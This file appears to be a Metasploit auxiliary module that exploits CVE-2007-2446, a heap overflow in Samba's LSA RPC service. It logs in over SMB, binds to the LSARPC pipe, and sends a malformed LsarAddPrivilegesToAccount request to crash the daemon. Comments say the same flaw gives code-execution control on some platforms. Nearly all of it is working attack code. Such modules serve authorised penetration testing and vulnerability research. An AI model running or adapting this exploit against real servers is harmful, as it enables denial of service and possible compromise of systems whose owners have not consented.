##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'


class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::DCERPC
  include Msf::Exploit::Remote::SMB
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Samba lsa_io_privilege_set Heap Overflow',
      'Description'    => %q{
        This module triggers a heap overflow in the LSA RPC service
      of the Samba daemon.
      },
      'Author'         => [ 'hdm' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['CVE', '2007-2446'],
          ['OSVDB', '34699'],
        ]
      ))

    register_options(
      [
        OptString.new('SMBPIPE', [ true,  "The pipe name to use", 'LSARPC']),
      ], self.class)

  end

  def run

    pipe = datastore['SMBPIPE'].downcase

    print_status("Connecting to the SMB service...")
    connect()
    smb_login()

    datastore['DCERPC::fake_bind_multi'] = false

    handle = dcerpc_handle('12345778-1234-abcd-ef00-0123456789ab', '0.0', 'ncacn_np', ["\\#{pipe}"])
    print_status("Binding to #{handle} ...")
    dcerpc_bind(handle)
    print_status("Bound to #{handle} ...")

    #    Linux: Needs heap magic to work around glibc (or TALLOC mode for 3.0.20+)
    # Mac OS X: PC control via memcpy to stack ptr
    #  Solaris: PC control via memcpy to stack ptr

    stub = lsa_open_policy(dcerpc)
    stub << NDR.long(1)
    stub << NDR.long(0xffffffff)
    stub << NDR.long(0x100)
    stub << "X" * 0x100

    print_status("Calling the vulnerable function...")

    begin
      # LsarAddPrivilegesToAccount
      dcerpc.call(0x13, stub)
    rescue Rex::Proto::DCERPC::Exceptions::NoResponse
      print_good('Server did not respond, this is expected')
    rescue => e
      if e.to_s =~ /STATUS_PIPE_DISCONNECTED/
        print_good('Server disconnected, this is expected')
      else
        raise e
      end
    end

    disconnect
  end

end
